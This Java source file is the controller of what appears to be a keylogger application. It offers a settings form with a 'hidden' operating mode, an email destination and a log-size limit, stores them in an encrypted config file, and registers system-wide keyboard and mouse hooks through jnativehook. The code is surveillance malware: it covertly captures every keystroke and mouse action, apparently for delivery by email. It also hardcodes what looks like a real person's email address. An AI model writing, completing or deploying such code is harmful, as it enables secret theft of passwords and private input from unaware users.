package main;

import events.GlobalKeyListener;
import events.GlobalMouseListener;
import javafx.collections.FXCollections;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.Button;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.layout.GridPane;
import javafx.stage.Stage;
import logic.Encryptor;
import logs.FileLogWriter;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.io.BufferedReader;
import java.io.FileReader;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.Callable;

public class Controller {

    private String mode = "opened";
    private String email = "bsuir.dmitriy.dronov@gmail.com";
    private long size = 5000;

    private Label modeLabel = new Label("Mode: ");
    private Label emailLabel = new Label("Email: ");
    private Label sizeLabel = new Label("Size: ");
    private ChoiceBox<String> modeChoiceBox;
    private TextField emailField = new TextField();
    private TextField sizeField = new TextField();
    private Button saveButton = new Button("Save");

    private GlobalKeyListener hookKeyboard = new GlobalKeyListener();
    private GlobalMouseListener hookMouse = new GlobalMouseListener();

    public GridPane getRoot(){
        GridPane root = new GridPane();
        root.setAlignment(Pos.CENTER);
        root.setHgap(10);
        root.setVgap(10);
        root.setPadding(new Insets(25, 25, 25, 25));

        List<String> modes = new LinkedList<>();
        modes.add("hidden");
        modes.add("opened");
        modeChoiceBox = new ChoiceBox<String>(FXCollections.observableList(modes));
        if(mode.equals("hidden")) modeChoiceBox.getSelectionModel().select(0);
        else modeChoiceBox.getSelectionModel().select(1);

        emailField.setText(email);
        sizeField.setText(""+size);

        saveButton.setOnAction(e -> saveButtonAction());

        root.add(modeLabel, 0,0);
        root.add(modeChoiceBox,1,0);
        root.add(emailLabel, 0, 1);
        root.add(emailField, 1,1);
        root.add(sizeLabel, 0, 2);
        root.add(sizeField, 1,2);
        root.add(saveButton, 1,3);

        return root;
    }

    public void init() {
        try (BufferedReader br = new BufferedReader(new FileReader(System.getProperty("user.dir") + "/src/config.conf"))) {
            mode = Encryptor.decrypt(br.readLine()).substring(6);
            email = Encryptor.decrypt(br.readLine()).substring(7);
            size = new Long(Encryptor.decrypt(br.readLine()).substring(6));
            System.out.println(mode+" "+email+" "+size);
        } catch (Exception ex) {
            ex.printStackTrace();
            try {
                rewriteConfig();
            } catch (Exception e) {
                e.printStackTrace();
                System.exit(1);
            }
        }
    }

    private void rewriteConfig() throws Exception{
        FileLogWriter fw = new FileLogWriter(System.getProperty("user.dir")+"/src/config.conf");
        fw.write(Encryptor.encrypt("mode: "+mode));
        fw.write(Encryptor.encrypt("email: "+email));
        fw.write(Encryptor.encrypt("size: "+size));
        fw.close();
    }

    private void saveButtonAction(){
        mode = modeChoiceBox.getSelectionModel().getSelectedItem();
        email = emailField.getText();
        size = new Long(sizeField.getText());
        hookKeyboard.setFileSize(size);
        hookMouse.setFileSize(size);
        try {
            rewriteConfig();
            init();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void initHook() throws Exception {
        hookKeyboard = new GlobalKeyListener();
        hookMouse = new GlobalMouseListener();
        hookKeyboard.setFileSize(size);
        hookMouse.setFileSize(size);
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        // Construct the example object.
        GlobalMouseListener example = new GlobalMouseListener();

        // Add the appropriate listeners.
        GlobalScreen.addNativeMouseListener(example);
        GlobalScreen.addNativeMouseMotionListener(example);
        GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
    }
}
